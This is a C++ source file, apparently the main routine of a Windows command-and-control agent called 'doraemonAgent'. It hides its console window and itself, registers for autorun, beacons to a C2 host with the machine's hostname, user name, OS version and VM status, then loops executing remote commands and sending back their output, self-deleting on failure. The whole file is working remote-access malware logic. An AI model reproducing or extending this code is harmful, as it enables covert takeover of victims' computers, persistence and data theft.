#include "pch.h"

#include "WSAInitializer.h"
#include "Client.h"
#include "AgentUtils.h"


void run();

int main()
{
	// hide console's window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// make agent hidden
	AgentUtils::Hide();

	// add to startup
	AgentUtils::AddAutoRun();

	try
	{
		// initiate WSA
		WSAInitializer wsaInit;
		
		// start CnC agent
		run();
	}
	catch (std::exception& e)
	{
		AgentUtils::SelfDelete();
	}

	return 0;
}


void run() {
	// connect to C2 server
	Client doraemonAgent;
	doraemonAgent.connect(C2_HOST, C2_PORT);

	// save initial information is JSON format
	json agentData;

	// gather information
	agentData["hostname"] = AgentUtils::ComputerName();
	agentData["username"] = AgentUtils::UserName();
	agentData["winVersion"] = AgentUtils::WinVersion();
	agentData["isVM"] = AgentUtils::IsVM();

	string agentStringData = agentData.dump();
	doraemonAgent.write(agentStringData);

	// Cnc loop
	while (true) {
		string cmdCommand = doraemonAgent.read();
		string cmdOutput = AgentUtils::execute(cmdCommand);
		doraemonAgent.write(cmdOutput);
	}
}